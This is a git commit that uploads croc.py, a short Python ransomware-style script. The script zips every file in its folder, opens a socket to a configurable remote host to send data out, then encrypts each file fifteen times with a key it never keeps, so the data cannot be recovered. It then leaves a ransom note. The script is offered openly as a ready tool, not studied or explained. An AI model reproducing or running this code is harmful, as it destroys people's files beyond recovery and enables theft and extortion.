6367bb6499b7a03d374126a4de9704fecbc521ee
j3r1ch0123 <110147529+j3r1ch0123@users.noreply.github.com>
2023-01-01 14:43:43 -0500

    Add files via upload

---
+++ croc.py
@@ -0,0 +1,48 @@
+#!/bin/python3.9
+import os
+import socket
+from zipfile import ZipFile
+from cryptography.fernet import Fernet
+
+RHOST = "127.0.0.1" #Change this
+RPORT = 9000 #Change this
+
+# Get a list of the files
+files = []
+for file in os.listdir():
+    if file == "croc.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+print(files)
+
+# Zip the files together
+filename = "files.zip"
+with ZipFile(filename, "w") as zipped:
+    for file in files:
+        zipped.write(file)
+
+# Send the files to a remote server
+s = socket.socket()
+s.connect((RHOST, RPORT))
+s.send(filename.encode())
+
+# Generate the key
+key = Fernet.generate_key()
+
+# Encrypt the files beyond repair
+for i in range(15):
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
+
+# Leave a note behind
+text = "[Write whatever you want]"
+with open("Note.txt", "w") as note:
+    note.write(text)
+
+# Remove the zip file
+os.remove(filename)
